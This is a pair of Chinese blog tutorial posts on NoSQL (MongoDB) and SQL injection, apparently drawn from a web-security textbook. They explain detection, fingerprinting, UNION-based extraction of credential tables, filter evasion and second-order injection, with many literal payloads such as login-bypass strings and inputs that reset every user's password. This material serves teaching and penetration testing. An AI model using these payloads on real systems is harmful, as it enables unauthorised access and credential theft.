  <entry>
    <title>注入NoSql</title>
    <url>/2019/03/24/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-3%E6%B3%A8%E5%85%A5NoSQL/</url>
    <content><![CDATA[<h1 id="注入NoSql"><a href="#注入NoSql" class="headerlink" title="注入NoSql"></a>注入NoSql</h1><p>术语NoSQL用于指各种不同于标准的关系数据库体系架构的数据存储区。NoSQL数据存储区呈现使用键/值映射的数据，并且不依赖于固定的方案，如传统的数据库表。键和值可以任意定义，而且值的格式通常与数据存储区无关。键/值存储的另一个特点在于，值可能为数据结构本身，因而可以实现层次化存储，这与数据库方案中的平面数据结构不同。</p>
<p>支持上述数据存储的NoSQL具有各方面的优势，这些优势主要体现在处理庞大的数据集方面，以便于根据需要对数据存储区中的层次化数据进行优化，以减少检索数据集的开销。在这些情况下，传统的数据库可能需要对表进行复杂的交叉引用，才能代表应用程序检索信息。</p>
<p>从Web应用程序安全的角度看，我们主要关注应用程序如何查询数据，因为这决定了攻击者可以进行何种形式的注入。就SQL注入而言，不同数据库产品采用的SQL语言答题相似。相反，NoSQL代表着一类全新的数据存储区，它们的行为各不相同。而且，它们并非全部使用单一的查询语言。</p>
<p>以下是NoSQL数据存储区采用的一些常用的查询方法：</p>
<ul>
<li>键/值查询</li>
<li>XPath</li>
<li>编程语言</li>
</ul>
<p>NoSQL是一种快速发展的相对较新的技术。与SQL等比较成熟的技术不同，它并没有进行大规模部署。因此，对于NoSQL相关漏洞的研究仍处于早期阶段。此外，由于许多NoSQL技术访问数据的方式十分简单，讨论注入NoSQL数据存储区的示例有时候明显是虚构的。</p>
<p>几乎可以肯定的是，当前和将来的Web应用程序使用NoSQL数据存储区的方式将存在可被利用的漏洞。</p>
<h3 id="注入MongoDB"><a href="#注入MongoDB" class="headerlink" title="注入MongoDB"></a>注入MongoDB</h3><p>许多NoSQL数据库利用现有的编程语言来提供灵活、可编程的查询机制。如果使用字符串连接构建查询，攻击者就可以尝试破坏数据并更改查询的语法。以下面的查询为例，它基于MongoDB数据存储区中的用户记录进行登录：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> Mongo();</span><br><span class="line">$db = $m-&gt;cmsdb;</span><br><span class="line">$collection = $db -&gt; user;</span><br><span class="line">$js = <span class="string">"function() &#123;return this.username = '$username' &amp; this.password = '$password';&#125;"</span>;</span><br><span class="line">$obj = $collection-&gt;findone(array(<span class="string">'where'</span> =&gt; $js));</span><br><span class="line"><span class="keyword">if</span> (isset($obj[<span class="string">"uid"</span>])) &#123;</span><br><span class="line">    $logged_in = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $logged_in = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$js是一个JavaScript函数，其代码是动态构建的，并且包含用户提交的用户名和密码。攻击者可以通过提供以下用户名和任意密码来避开验证逻辑：</p>
<p><strong>Marcus’//</strong></p>
<p>生成的JavaScript函数如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>.username = <span class="string">'marcus'</span><span class="comment">//' &amp; this.password = 'aaa';&#125;</span></span><br></pre></td></tr></table></figure>

<p>在JavaScript中，双正斜杠（//）表示行尾注释，因此，函数中的剩余代码将被注释掉。另一种不使用注释而确保$js函数始终返回为“真”的方法，是提供以下用户名：</p>
<p><strong>a’ || 1 == 1 || ‘a’ == ‘a</strong></p>
<p>JavaScript以如下方式解释各种运算符：</p>
<p><strong>(this.username = ‘a’ || 1 == 1) || (‘a’ == ‘a’ &amp; this.password == ‘aaa’);</strong></p>
<p>这将匹配用户集合中的所有资源，因为第一个选择性条件始终为真（1始终等于1）。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>NoSql</tag>
      </tags>
  </entry>
  <entry>
    <title>注入sql</title>
    <url>/2019/03/23/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-2%E6%B3%A8%E5%85%A5SQL/</url>
    <content><![CDATA[<h1 id="注入SQL"><a href="#注入SQL" class="headerlink" title="注入SQL"></a>注入SQL</h1><p>数据库中的信息通过SQL（Structured Query Language，结构化查询语言）访问。SQL可用于读取、更新、增加或删除数据库中保存的信息。</p>
<p>SQL是一种解释型语言，Web应用程序经常建立合并用户提交的数据的SQL语句。因此，如果建立语句的方法不安全，那么应用程序可能易于受到SQL注入攻击。</p>
<h2 id="利用一个基本的漏洞"><a href="#利用一个基本的漏洞" class="headerlink" title="利用一个基本的漏洞"></a>利用一个基本的漏洞</h2><p>下面以一个书籍零售商使用的Web应用程序为例，该应用程序允许用户根据作者、书名、出版商等信息搜索产品。完整的书籍目录保存在数据库中，应用程序使用SQL查询、根据用户提交的搜索项获取各种书籍的信息。</p>
<p>当一名用户搜索由Wiley出版的所有书籍时，应用程序执行以下查询：</p>
<p><strong>SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ and published = 1</strong></p>
<p>该查询要求数据库检查书籍表的每一行，提取每条publisher列为wiley值的记录，并返回所有这些记录。然后应用程序处理这组记录，并通过一个HTML页面将结果显示给用户。</p>
<p>在这个查询中，等号左边的词由SQL关键字、表和数据库列名称构成。这个部分的全部内容由程序员在创建应用程序时建立。当然，表达式wiley由用户提交，它是一个数据项。SQL查询中的字符串数据必须包含在单引号内，与查询的其他内容隔开来。</p>
<p>现在思考一下，如果用户搜索所有由O’Reilly出版的书籍，会出现什么情况。应用程序将执行以下查询：</p>
<p><strong>SELECT author, title, year FROM books WHERE publisher = ‘O’Reilly’ and published = 1</strong></p>
<p>在这个示例中，查询解释器以和前一个示例相同的方式到达字符串数据位置。它解析这个包含在单引号中的数据，得到值O。然后遇到表达式Reilly’，这并不是有效的SQL语法，因此，应用程序生成一条错误信息：</p>
<p><strong>Incorrect syntax near ‘Reilly’.</strong></p>
<p><strong>Server: Msg 105,Level 15, State 1, Line1</strong></p>
<p>*<em>Unclosed quotation mark before the  character string ‘ *</em></p>
<p>如果应用程序以这种方式运行，那么它非常容易遭到SQL注入。攻击者可提交包含引号的输入终止它控制的字符串，然后编写任意的SQL修改开发者想要的应用程序执行的查询。例如，在这个示例中，攻击者可以对查询进行修改，通过以下输入项，返回零售商目录中的每一本书籍。</p>
<p><strong>Willey’ OR 1=1–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT author, title, year, FROM books WHERE publisher = ‘Willey’ OR 1=1 –’ AND published = 1</strong></p>
<p>这个查询对开发者查询中的WHERE子句进行修改，增加了另外一个条件。数据库将检查书籍表的每一行，提取publisher列值位Willey<strong>或其中1=1</strong>的每一条记录。因为1总是等于1，所以数据库将返回书籍表中的所有记录。</p>
<p>攻击者的输入中的双连字符在SQL中是一个有意义的表达式，它告诉查询解释器该行的其他部分属于注释，应被忽略。在一些SQL注入攻击中，这种技巧机器重要，因为它允许忽略由应用程序开发者建立的查询的剩余部分。在MySQL中，需要在双连字符后加入一个空格，或者使用<strong>“#”</strong>符号指定注释。</p>
<p>有些时候，可以不使用注释符号处理字符串末尾部分的引号，而用一个需要引号包含的字符串数据结束注入的输入，依次<strong>“平衡引号”</strong>，例如，输入以下搜索项：</p>
<p><strong>willey’ or ‘a’ = ‘a</strong></p>
<p>将生成以下查询：</p>
<p><strong>SELECT author, title,year FROM books where publisher = ‘willey’ OR ‘a’ = ‘a’ and publisher = 1</strong></p>
<p>这个查询完全有效，可得到和1=1攻击相同的效果。 </p>
<h2 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h2><p>当然，当与一个远程应用程序交互时，通常情况下不可能提前知道用户输入的一个特殊数据项将由哪种类型的语句处理。但是，可以根据使用的应用程序功能进行合理地猜测。</p>
<h3 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h3><p>SELECT语句被用于从数据库中获取信息。它们常用于应用程序响应用户操作而返回信息的功能中，如浏览一个产品目录、查看一名用户的资料或者进行一项搜索。根据数据库中的数据核对用户提交的信息的登录功能也经常使用这种语句。</p>
<p>如在前面的示例中说明的，SQL注入攻击的进入点（entry point）通常是查询中的WHERE子句，它将用户提交的数据传送给数据库，以控制查询结果的范围。因为WHERE子句一般在SELECT语句的最后，攻击者就可以使用注释符号将查询阶段到其输入的结束位置，而不会使整个查询的语法失效。</p>
<p>SQL注入漏洞偶尔也会影响SELECT查询的其他部分，如ORDER BY子句或表和列名称。</p>
<h3 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h3><p>INSERT语句用于在表中建立一个新的数据行。应用程序通常使用这种语句添加一条新的审计日志、创建一个新用户账户或生成一个新订单。</p>
<p>例如，如果一个应用程序允许用户自我注册， 指定它们自己的用户名和密码，就可以使用下面的语句将用户资料插入user表中。</p>
<p><strong>INSERT INTO users (username, password, ID, privs) VALUES (‘daf’, ‘secret’, 2248, 1)</strong></p>
<p>如果username或password字段存在SQL注入漏洞，那么攻击者就可以在表中插入任何数据，包括他自己的ID和privs值。然而，要想这样做，攻击者就必须确保VALUES子句的其他部分正常运行。特别是其中数据项的个数和类型必须正确。例如，当注入username字段时，攻击者可以提交以下输入：</p>
<p><strong>foo’, ‘bar’, 9999, 0)–</strong></p>
<p>它将建立一个ID为9999，privs为0的账户。加入privs字段用来决定账户权限，那么攻击者可以利用它创建的一个管理用户。</p>
<p>有时，攻击者完全盲目地注入一个INSERT语句也能够从应用程序中提取出字符串数据。例如，攻击者可以拦截数据库的版本字符串，并将它插入自己用户资料的一个字段中；正常情况下，浏览器将显示数据库的版本信息。</p>
<p>当设法注入一个INSERT语句时，可能无法提前知道需要提交多少个参数或参数的类型。在前面的示例中，可以通过在VALUES子句中持续增加一个新的字段，知道应用程序创建了确实想要的用户账户，从而解决上述问题。例如，当注入username字段时，可以提交以下输入：</p>
<p><strong>Foo’)–</strong></p>
<p><strong>Foo’, 1)–</strong></p>
<p><strong>Foo’, 1, 1)–</strong></p>
<p><strong>Foo’, 1, 1, 1)–</strong></p>
<p>由于大多数数据库都会隐式地讲一个整数转换为字符串，可以在每个位置都是用一个整数。在这个示例中，不管其他字段如何，它将生成一个用户名为Foo、密码为1的账户。</p>
<p>如果发现使用值1人员遭到拒绝，可以尝试使用值2000，许多数据库也会隐式地将它转换成基于数据的数据类型。</p>
<p>确定注入点之后的正确字段数后，在MS-SQL中，测试员可以任意添加另外一个查询，并采用后面将介绍的基于推断的技巧。</p>
<p>在Oracle中，则可以在insert查询内发布subselect查询。使用后面基于推断的技巧，该subselect查询可能导致主查询成功或失败。</p>
<h3 id="update语句"><a href="#update语句" class="headerlink" title="update语句"></a>update语句</h3><p>UPDATE语句用于修改表中的一行或几行数据。它们经常用在用户修改已有数据值的功能中，例如，更新联系信息、修改密码或更改订单数量。</p>
<p>典型UPDATE语句的运行机制和INSERT语句类似，只是UPDATE语句中通常包含一个WHERE子句，告诉数据库更新表中哪些行的数据。例如，当用户修改密码时，应用程序可能会执行以下查询：</p>
<p><strong>UPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password = ‘secret’</strong></p>
<p>实际上，这个查询首先合适用户的现有密码是否争取，如果密码无误，就用新的值更新它。如果这项功能存在SQL注入漏洞，那么攻击者就能避开现有密码检查，通过输入以下用户名更新管理员的密码：</p>
<p><strong>admin’–</strong></p>
<p>由于无法提前知道应用程序将根据专门设计的输入执行什么操作，因此，在一个远程应用程序中探查SQL注入漏洞往往非常危险。特别注意，修改UPDATE语句中的WHERE子句可能会使一个重要的数据库表发生彻底的改变。例如，上面的攻击者之前已经提交了以下用户名：</p>
<p><strong>admin’ or 1 = 1</strong></p>
<p>那么应用程序可能会执行以下查询：</p>
<p><strong>UPDATE users SET password = ‘newsecret’ where user = ‘admin’ or 1 = 1</strong></p>
<p>它会重新设置每一名用户的密码。</p>
<h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><p>DELETE语句用于删除表中的一行或几行数据，例如，用户从他们的购物篮中删除意见商品或从个人资料中删除一个交货地址。</p>
<p>与UPDATE语句一样，DELETE语句通常使用WHERE子句告诉数据库更新表中哪些行的数据，并很可能在这个子句中并入用户提交的数据。破坏正常运行的WHERE子句可能会造成严重的后果。</p>
<h2 id="查明SQL注入漏洞"><a href="#查明SQL注入漏洞" class="headerlink" title="查明SQL注入漏洞"></a>查明SQL注入漏洞</h2><p>在最明显的情形中，只需向应用程序提交一个意外输入，就可以发现并最终确定一个SQL注入漏洞。在其他情况下，这种缺陷可能非常微妙，很难与其他类型的漏洞或不会造成安全威胁的“良性”异常区分开来。但是，可以按顺序采取各种步骤查明绝大多数的SQL注入漏洞。</p>
<p>在探查SQL注入漏洞时，一定要确保完全遍历任何可以提交专门设计的输入的多阶段过程。应用程序通常会从几个请求中收集一组数据，一旦收集到全部的数据，就将其保存在数据库中。这时，如果仅在每个请求中提交专门设计的数据并监控应用程序对那个请求的响应，就会遗漏许多SQL注入漏洞。</p>
<h3 id="注入字符串数据"><a href="#注入字符串数据" class="headerlink" title="注入字符串数据"></a>注入字符串数据</h3><p>如果SQL查询合并用户提交的数据，它会将这些数据包含在单引号中。为利用任何SQL注入漏洞，攻击者需要摆脱这些引号的束缚。</p>
<p>测试步骤：</p>
<ol>
<li>提交一个单引号作为目标查询的数据。观察是否会造成错误，或结果是否与原始结果不同。如果收到详细错误信息，了解该信息的含义。</li>
<li>如果发现错误或其他异常行为，同时提交两个单引号，看会出现什么情况。数据库使用两个单引号作为转义序列，表示一个原义单引号，因此这个序列被解释称引用字符串中的数据，而不是结束字符串的中支付。如果这个输入导致错误或异常行为消失，则应用程序可能易于受SQL注入攻击。</li>
<li>为进一步核实漏洞是否存在，可以使用SQL连接符建立一个等同于“良性”输入的字符串。如果应用程序以与处理对应“良性”输入相同的方式处理专门设计的输入，那么它很可能易于受到攻击。每种数据库使用的字符串连接方法各不相同。在易受攻击的应用程序中，可以注入以下示例构建等同于FOO的输入：<ul>
<li>Oracle： ‘||’FOO</li>
<li>MS-SQL: ‘+’FOO</li>
<li>MySQL: ‘ ‘FOO [两个单引号之间有一个空格]</li>
</ul>
</li>
</ol>
<h3 id="注入数字数据"><a href="#注入数字数据" class="headerlink" title="注入数字数据"></a>注入数字数据</h3><p>如果SQL查询合并用户提交的数字数据，应用程序仍然会将它包含在单引号之中，作为字符串数据进行处理。因此，一定要执行前面描述的针对字符串数据的渗透测试步骤。但是，许多时候，营养程序会将数字数据以数字格式直接传送到数据库中，并不把它放入单引号中。如果前面描述的测试方法无法检测到漏洞，还可以采取以下针对数字数据的特殊测试步骤。</p>
<p>测试步骤：</p>
<ol>
<li><p>尝试输入一个结果等于原始数字值的简单数学表达式。例如，原始值为2，尝试提交<strong>1+1</strong>或<strong>3-1</strong>。如果应用程序作出相同的响应，则表示它易于受到攻击。</p>
</li>
<li><p>如果证实被修改的数据会对应用程序的行为造成明显影响，则前面描述的测试方法最为可靠。例如，如果应用程序使用数字化PageID参数指定应返回什么内容，则用<strong>1+1</strong>代替2得到相同的结果明显表示存在SQL注入。但是如果能够在数字化参数中插入任意输入，但应用程序的行为却没有发生改变，那么前面的方法就无法发现漏洞。</p>
</li>
<li><p>如果第一个测试方法取得成功，就可以利用更复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证据。ASCII值位65，在SQL中，以下表达式等于2.</p>
<p><strong>67-ASCII(‘A’)</strong></p>
</li>
<li><p>如果单引号被过滤掉，那么前面的测试方法就没有作用。但是，这时可以利用这样一个事实：即在必要时，数据库会隐含地将数字数据转化为字符串数据。例如，因为字符1的ASCII值位49，在SQL中，以下表达式等于2.</p>
<p><strong>51-ASCII(1)</strong></p>
</li>
</ol>
<h3 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h3><p>如果用户提交的数据被插入SQL查询结构。而不是查询的数据项中，这时，实施SQL注入攻击只需要直接应用有效的SQL语法，而不需要任何“转义”。</p>
<p>SQL查询结构中最常见的注入点是ORDER BY子句。ORDER BY关键字接受某个列名称或编号，并根据该列中的值对结果集进行排序。</p>
<p>例如，使用以下查询可以检索一个可排序的图书表：</p>
<p><strong>SELECT author, title, year FROM bookes WHERE publisher = ‘Wiley’ ORDER BY title ASC</strong></p>
<p>如果ORDER BY中的列名称title由用户指定，就没有必要使用单引号，因为用户提交的数据已经直接修改了SQL查询的结构。</p>
<p>在列名称中查找SQL注入漏洞可能会相当困难。如果提交一个并非有效列名称的值，查询将导致错误。这意味着，无论攻击者提交路径遍历字符串、单引号、双引号或其他任意字符串，应用程序都会返回相同的响应。因此，采用程勇的自动模糊测试和手动测试技巧往往会遗漏某些漏洞。如果提交用于探查各种漏洞的标准测试字符串全部导致相同的响应，这本身并不表示出现任何错误。</p>
<ol>
<li><p>记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数。</p>
</li>
<li><p>提供一系列在参数中提交数值值的请求，从数字1开始，然后逐个请求递增：</p>
<ol>
<li><p>如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到ORDER BY子句中。在SQL中，ORDER BY 1将依据第一列进行排序。然后将这个数字增加到2将更改数据的显示顺序，以依据第二个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，可以通过使用以下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他SQL：</p>
<p><strong>1 ASC –</strong></p>
<p><strong>1 DESC –</strong></p>
</li>
<li><p>如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中。例如：</p>
<p><strong>SELECT 1, title, year FROM book WHERE publisher = ‘Wiley’</strong></p>
</li>
</ol>
</li>
</ol>
<h2 id="“指纹”识别数据库"><a href="#“指纹”识别数据库" class="headerlink" title="“指纹”识别数据库"></a>“指纹”识别数据库</h2><p>即使由于某种原因无法提取到版本信息，还是可以使用其他方法识别数据库。一种最可靠的方法是根据数据库连接字符串的不同方式进行识别。在控制某个字符串数据项的查询中，可以在一个请求中提交一个特殊的值，然后测试各种连接方法，以生成那个字符串。如果得到相同的结果，皆可以确定所使用的数据库类型。下面的实例说明常用的数据库如何构建services字符串。</p>
<ul>
<li>Oracle：’serv’ || ‘ices’</li>
<li>MS-SQL: ‘serv’ + ‘ices’</li>
<li>MySQL: ‘serv’  ‘ices’ 【中间有空格】</li>
</ul>
<p>如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项在目标数据库中的求值结果为0，在其他数据库中则会导致错误。</p>
<ul>
<li>Oracle：BITAND(1, 1)-BITAND(1, 1)</li>
<li>MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED</li>
<li>MySQL: CONNECTION_ID()-CONNECTION_ID()</li>
</ul>
<p>在识别数据库时，MySQL如何处理某些行内注释也是一个值得关注的问题。吐过一个注释以感叹号开头，接着是数据库版本字符串，那么只要数据库的实际版本等于或高于那个字符串，应用程序就会将注释内容解释为SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。与C中的预处理指令类似，程序员也可以对这一点加以利用，编写出根据所使用数据库版本进行处理的不同代码。攻击者还可以利用它来识别数据库的实际版本。例如，如果使用的MySQL版本高于或等于3.23.02，注入下面的字符串将使SELECT语句的WHERE子句为假：</p>
<p><strong>/*!32302 and 1=0 */</strong></p>
<h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h2><p>SQL使用UNION操作符将两个或几个SELECT语句的记过组合到一个独立结果中。如果一个Web应用程序的SELECT语句存在SQL注入漏洞，通常可以使用UNION操作符执行另一次完全独立的查询，并将它的结果与第一次查询的结果组合在一起。如果应用程序向浏览器返回查询结果，那么就可以使用这种技巧从应用程序中提取任意的数据。</p>
<p>UNION操作符可在SQL注入中发挥非常巨大的作用。但是，在利用它发动攻击之前，攻击者有必要了解它的两个重要限制。</p>
<ol>
<li>如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同。也就是说他们的列数必须相同，必须使用按相同顺序出现的相同或兼容的数据类型。</li>
<li>为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称。</li>
</ol>
<h2 id="使用UNION提取数据"><a href="#使用UNION提取数据" class="headerlink" title="使用UNION提取数据"></a>使用UNION提取数据</h2><p>下面我们将分析一个攻击，虽然该攻击针对的是MS-SQL数据库，但它采用的攻击方法适用于所有数据库技术。以用户维护联系人列表及查询和更新联系人信息的通讯录应用程序为例。如果用户在通讯录中搜索名为Matthew的联系人，浏览器将提交以下数据：</p>
<p><strong>Name= Matthew</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
</tbody></table>
<p>首先，我们需要确定请求的猎术。对单一列进行测试导致了以下错误消息：</p>
<p><strong>Name=Matthew’%20union%20select%20null–</strong></p>
<p>All queries combined using a UNION, INTERSECT or EXCEPT operator must hava an equal number of expressions in their target lists.</p>
<p>我们添加另一个NULL，并得到同样的错误。于是，我们继续添加NULL， 知道查询被执行，并在结果表中生成另一个数据项，如下所示：</p>
<p><strong>Name=Matthew’%20union%20select%20null,null,null,null,null–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件格式</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
<tr>
<td>[空]</td>
<td>[空]</td>
</tr>
</tbody></table>
<p>我们验证查询的第一列是否包含字符串数据：</p>
<p><strong>Name=Matthew’%20union%20select%20’a’,null,null,null,null–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件格式</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
<tr>
<td>[a]</td>
<td>[空]</td>
</tr>
</tbody></table>
<p>接下来，需要查明可能包含有用信息的数据库表和列的名称。为此，我们需要查询元数据表information_schema .columns，其中包含数据库中的所有表和列名称的详细资料。使用以下请求可以检索上述信息：</p>
<p><strong>Name=Matthew’%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handytrick@gmail.com">handytrick@gmail.com</a></td>
</tr>
<tr>
<td>shop_items</td>
<td>Price</td>
</tr>
<tr>
<td>shop_items</td>
<td>Prodid</td>
</tr>
<tr>
<td>shop_items</td>
<td>Prodname</td>
</tr>
<tr>
<td>addr_book</td>
<td>Contactemail</td>
</tr>
<tr>
<td>addr_book</td>
<td>Contactname</td>
</tr>
<tr>
<td>Users</td>
<td>Username</td>
</tr>
<tr>
<td>Users</td>
<td>Password</td>
</tr>
</tbody></table>
<p>从以上结果可以确定，很明显，我们可以同用户表开始提取数据。这是使用以下查询：</p>
<p><strong>Name=Matthew’%20UNION%20select%20username,password,null,null,null%20from%20users–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handytrick@gmail.com">handytrick@gmail.com</a></td>
</tr>
<tr>
<td>administrator</td>
<td>fme69</td>
</tr>
<tr>
<td>dev</td>
<td>uber</td>
</tr>
<tr>
<td>marcus</td>
<td>8printo</td>
</tr>
<tr>
<td>smith</td>
<td>twosisty</td>
</tr>
<tr>
<td>jlo</td>
<td>6kdown</td>
</tr>
</tbody></table>
<p>MS-SQL、MySQL和许多其他数据库（包括SQLite和Postgresql）均支持information_schema。它主要用于保存数据库元数据，这也使它成为探查数据库的攻击者的主要目标。需要注意的是，Oracle并不支持该方案。对Oracle数据库实施攻击时，攻击方法在其他各方面可能完全相同。但是，需要使用查询SELECT table_name,column_name FROM all_tab_columns来检索有关数据库表和列的信息。（使用user_tab_columns表以针对当前数据库）通常，在分析大型数据库以探查攻击目标时，最好是查找有用的列名称，而不是表。例如：</p>
<p><strong>SELECT table_name,column_name FROM  infotmation_schema.columns where column_name like ‘%PASS%’</strong></p>
<p>如果目标表返回了多个列，则可以将这些列串联到一个单独列中，这样肩锁起来会更加方便，因为，这时只需要在原始查询中确定一个varchar字段：</p>
<ul>
<li>Oracle：SELECT table_name||’:’||cikumn_name FROM all_tab_columns</li>
<li>MS-SQL:SELECT table_name+’:’+column_name from information_schema.columns</li>
<li>MySQL: SELECT CONTACT(table_name,’:’,column_name) FROM information_schema.columns</li>
</ul>
<h2 id="避开过滤"><a href="#避开过滤" class="headerlink" title="避开过滤"></a>避开过滤</h2><p>有时，易受SQL注入攻击的应用程序可能会执行各种输入过滤以防止攻击者无限制地利用其中存在的缺陷。例如，应用程序可能会删除或净化某些字符，或阻止常用的SQL关键字。这种过滤通常非常容易避开，这时可尝试使用各种技巧。</p>
<h3 id="避免使用被阻止的字符"><a href="#避免使用被阻止的字符" class="headerlink" title="避免使用被阻止的字符"></a>避免使用被阻止的字符</h3><p>如果应用程序删除或编码某些在SQL注入攻击中经常用到的字符，不使用这些字符仍然能够实施攻击。</p>
<ul>
<li><p>如果要注入数字数据字段或列名称，不一定必须使用单引号。要在攻击有效载荷中插入字符串，不使用引号仍可以做到这一点。这时，可以通过各种字符串函数，使用每个字符的ASCII代码动态构建一个字符串。例如，下面两个查询分别用于Oracle和MS-SQL，它们等同于SELECT ename,sal from emp where ename = ‘marcus’:</p>
<p><strong>SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)</strong></p>
</li>
<li><p>如果注释符号被阻止，通常可以设计注入的数据，使其不会破会周围查询的语法。例如，不用注入</p>
<p><strong>‘ or 1=1–</strong></p>
<p>可以注入</p>
<p><strong>‘ or ‘a’=’a</strong></p>
</li>
<li><p>在MS-SQL数据库中注入批量查询时，不必使用分号分隔符。只要纠正所有批量查询的语法，无论你是否使用分号，查询解析器都会正确解释他们。</p>
</li>
</ul>
<h3 id="避免使用简单确认"><a href="#避免使用简单确认" class="headerlink" title="避免使用简单确认"></a>避免使用简单确认</h3><p>一些输入确认机制使用一个简答的黑名单，阻止或删除任何出现在这个名单中的数据。在这种情况下，应该尝试使用标准的攻击方法，寻找确认和规范化机制中的常见缺陷。例如，如果SELECT关键字被阻止或删除，可以尝试使用以下输入：</p>
<p><strong>SeleCt</strong></p>
<p><strong>%00SELECT</strong></p>
<p><strong>SELSELECTECT</strong></p>
<p><strong>%52%45%4c%45%43%54</strong></p>
<p><strong>%2553%2545%254c%2545%2543%2554%</strong></p>
<h3 id="使用SQL注释"><a href="#使用SQL注释" class="headerlink" title="使用SQL注释"></a>使用SQL注释</h3><p>与C++一样，我们也可以再SQL语句中插入行内注释，注释内容包含在<strong>/*</strong>与<strong>*/之间</strong>。如果应用程序阻止或删除输入中空格，可以使用注释“冒充注入数据中的空白符。例如：</p>
<p><strong>SELECT /*foo*/ username,password FR/<em>foo\</em>/OM users</strong></p>
<p>在MySQL语法中，注释甚至可以插入关键字中，这种方法可避开某些输入确认过了，同时保留查询中的语法。例如：</p>
<p><strong>SEL/*foo*/ECT /*foo*/ username,password FR/<em>foo\</em>/OM users</strong></p>
<h3 id="利用有缺陷的过滤"><a href="#利用有缺陷的过滤" class="headerlink" title="利用有缺陷的过滤"></a>利用有缺陷的过滤</h3><p>输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序在对多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面的缺陷。</p>
<h2 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h2><p>一种特别有益的避开过滤的方法与二阶有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一旦数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不想面向因特网的主要应用程序一样安全，但却拥有较高权限的数据库账户。</p>
<p>在一些应用程序中，用户输入在到达时通过转义单引号来进行确认。在前面搜索书籍的示例中，这种方法明显有效。当用户输入搜索项O’Reilly时，应用程序执行以下查询：</p>
<p><strong>SELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’</strong></p>
<p>在这个查询中，用户提交的单引号被转换为两个单引号，因而传送给数据库的搜索项与用户最初的输入的表达式具有相同的字符含义。</p>
<p>与单引号配对方法有关的问题出现在更复杂的情形中，此时同一个数据项被提交给几个SQL查询，然后写入数据库被几次读取。</p>
<p>回到前面那个允许用户自我注册并且在一个INSERT语句中存在SQL注入漏洞的应用程序。假设开发者将修复出现在用户数据中的所有单引号配对导致的漏洞。注册用户名<strong>foo’</strong>来建立如下查询，他不会在数据库中造成问题：</p>
<p><strong>INSERT INTO users (username, password, ID,privs) VALUES(‘foo’’’, ‘secret’, 2248, 1)</strong></p>
<p>目前为止，一切正常。然而，假设应用程序还执行密码修改功能，那么只有通过验证的用户才能访问这项功能，而且为了加强保护，应用程序要求用户提供原始密码。然后应用程序从数据库中提取用户的当前密码，并对两个字符串进行比较，核对用户提供的密码是否正确。要完成核对任务，它首先要从数据库中提取用户的用户名，然后建立如下查询：</p>
<p><strong>SELECT password FROM users WHERE username = ‘foo’’</strong></p>
